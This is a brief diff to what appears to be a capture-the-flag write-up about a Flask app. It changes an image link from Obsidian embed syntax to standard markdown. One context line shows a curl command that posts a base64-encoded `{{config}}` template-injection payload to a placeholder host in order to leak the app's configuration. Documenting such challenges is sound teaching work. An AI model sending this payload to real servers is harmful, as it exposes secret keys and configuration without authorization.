@@ -44,4 +44,4 @@ app.run(host='0.0.0.0', port=1234)
 curl --data expr="$(echo '{{config}}' | base64)" http://<host>:<port>/
 ```
 
-![[Pasted image 20230508010747.png|1000]]
+![](<./img/Pasted image 20230508010747.png>)
